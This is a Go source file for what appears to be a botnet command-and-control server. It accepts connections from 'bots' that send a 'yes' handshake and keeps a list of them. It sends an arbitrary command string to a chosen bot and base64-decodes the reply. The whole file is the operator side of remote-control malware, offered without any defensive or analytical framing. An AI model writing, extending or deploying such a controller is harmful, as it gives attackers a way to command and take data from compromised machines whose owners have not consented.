package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"sync"
)

type Server struct {
	Listener net.Listener
	Started  bool
	Bots     []Bot
	RWMutex  sync.RWMutex
}

type Bot struct {
	Connection net.Conn
}

func (s *Server) New(network string, address string) error {
	s.RWMutex.Lock()
	defer s.RWMutex.Unlock()

	if s.Started {
		return ErrExistingServer
	}

	listener, err := net.Listen(network, address)
	if err != nil {
		return err
	}

	s.Listener = listener
	s.Started = true

	go func() {
		for {
			connection, err := s.Listener.Accept()
			if err == net.ErrClosed {
				return
			}

			if err != nil {
				fmt.Println("Error accepting connection:", err)
				continue
			}

			go s.HandleConnection(connection)
		}
	}()

	return nil
}

func (s *Server) Close() error {
	s.RWMutex.Lock()
	defer s.RWMutex.Unlock()

	if !s.Started {
		return ErrClosedServer
	}

	err := s.Listener.Close()
	if err != nil {
		return err
	}

	s.Listener = nil
	s.Started = false
	return nil
}

func (s *Server) ListBots() []Bot {
	s.RWMutex.Lock()
	defer s.RWMutex.Unlock()

	return s.Bots
}

func (s *Server) HandleConnection(connection net.Conn) {
	s.RWMutex.Lock()
	defer s.RWMutex.Unlock()

	data, err := bufio.NewReader(connection).ReadString('\n')
	if err != nil {
		fmt.Printf("Could not read data from connection: %v\n", err)
	}

	datas := strings.Split(data, " ")

	if datas[0] != "yes\n" {
		fmt.Printf("Bad data from bot, %v\n", data)
		return
	}

	fmt.Printf("New bot!\n")
	s.Bots = append(s.Bots, Bot{
		Connection: connection,
	})
}

func (s *Server) SendCommand(botIndex int, command string) (string, error) {
	s.RWMutex.Lock()
	defer s.RWMutex.Unlock()

	if botIndex >= len(s.Bots) {
		return "", ErrUnknownBot
	}

	bot := s.Bots[botIndex]

	_, err := bot.Connection.Write([]byte(command))
	if err != nil {
		s.Bots = append(s.Bots[:botIndex], s.Bots[botIndex+1:]...)
		return "", err
	}

	data, err := bufio.NewReader(bot.Connection).ReadString('\n')
	if err != nil {
		s.Bots = append(s.Bots[:botIndex], s.Bots[botIndex+1:]...)
		return "", err
	}

	dataDecoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return "", err
	}

	return string(dataDecoded), nil
}
